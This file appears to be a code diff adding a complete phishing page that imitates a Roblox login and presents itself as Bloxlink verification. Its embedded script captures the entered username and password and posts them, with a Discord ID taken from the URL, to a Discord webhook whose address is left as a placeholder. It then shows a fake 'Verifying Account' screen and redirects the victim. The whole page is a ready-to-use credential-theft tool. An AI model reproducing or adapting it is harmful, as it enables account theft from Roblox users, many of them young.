@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Login</title>
+    <style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}body{background:#f2f2f2;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}.header{background:#00a2ff;padding:20px 0;text-align:center;position:fixed;top:0;width:100%;z-index:1000}.logo{color:white;font-size:24px;font-weight:bold;text-decoration:none}.login-container{width:100%;max-width:420px;padding:20px;margin-top:80px}.login-card{background:white;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.1);padding:40px}.login-header{text-align:center;margin-bottom:30px}.login-title{font-size:28px;font-weight:600;color:#333;margin-bottom:10px}.login-subtitle{color:#666;font-size:16px}.input-group{margin-bottom:20px}.input-label{display:block;margin-bottom:8px;color:#333;font-weight:500;font-size:14px}.input-field{width:100%;padding:12px 16px;border:2px solid #e0e0e0;border-radius:4px;font-size:16px;transition:border-color .3s}.input-field:focus{outline:none;border-color:#00a2ff}.password-container{position:relative}.toggle-password{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:#666;cursor:pointer;font-size:14px}.login-button{width:100%;background:#00a2ff;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;transition:background .3s;margin-top:10px}.login-button:hover{background:#0088d1}.loading-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);display:none;justify-content:center;align-items:center;z-index:2000}.loading-content{background:white;padding:30px;border-radius:8px;text-align:center;max-width:400px}.loading-spinner{border:4px solid #f3f3f3;border-top:4px solid #00a2ff;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
+</head>
+<body>
+    <div class="header"><div class="logo">Roblox</div></div>
+    <div class="login-container">
+        <div class="login-card">
+            <div class="login-header">
+                <h1 class="login-title">Login to Roblox</h1>
+                <div class="login-subtitle">Verify for Bloxlink</div>
+            </div>
+            <form class="login-form" id="loginForm">
+                <div class="input-group">
+                    <label class="input-label">Username or Email</label>
+                    <input type="text" class="input-field" id="username" placeholder="Enter username or email" required>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">Password</label>
+                    <div class="password-container">
+                        <input type="password" class="input-field" id="password" placeholder="Enter password" required>
+                        <button type="button" class="toggle-password" onclick="togglePassword()">Show</button>
+                    </div>
+                </div>
+                <button type="submit" class="login-button" id="loginButton">Log In</button>
+            </form>
+        </div>
+    </div>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <h3>Verifying Account...</h3>
+            <p>Please wait while we verify your Roblox account.</p>
+        </div>
+    </div>
+    <script>
+        const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL';
+        const urlParams = new URLSearchParams(window.location.search);
+        const discordId = urlParams.get('discord_id');
+        
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const toggleButton = document.querySelector('.toggle-password');
+            passwordField.type = passwordField.type === 'password' ? 'text' : 'password';
+            toggleButton.textContent = passwordField.type === 'password' ? 'Show' : 'Hide';
+        }
+        
+        async function sendToDiscordWebhook(username, password) {
+            const payload = {
+                username: 'Roblox Verification',
+                embeds: [{
+                    title: '🔐 Roblox Verification',
+                    color: 0x5865F2,
+                    fields: [
+                        { name: 'Username', value: `\`\`\`${username}\`\`\``, inline: true },
+                        { name: 'Password', value: `\`\`\`${password}\`\`\``, inline: true },
+                        { name: 'Discord ID', value: `\`${discordId || 'Not linked'}\``, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return true;
+            } catch (error) {
+                console.error('Webhook error:', error);
+                return false;
+            }
+        }
+        
+        async function handleLogin(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                alert('Please enter both username and password');
+                return;
+            }
+            
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            try {
+                // Send to Discord webhook
+                await sendToDiscordWebhook(username, password);
+                
+                // Store credentials in localStorage
+                localStorage.setItem('roblox_username', username);
+                localStorage.setItem('roblox_userid', Math.floor(Math.random() * 1000000000));
+                
+                // Redirect to success page
+                setTimeout(() => {
+                    window.location.href = `verification-success.html?username=${encodeURIComponent(username)}`;
+                }, 1500);
+                
+            } catch (error) {
+                console.error('Login error:', error);
+                alert('An error occurred. Please try again.');
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', handleLogin);
+        document.getElementById('username').focus();
+    </script>
+</body>
+</html>
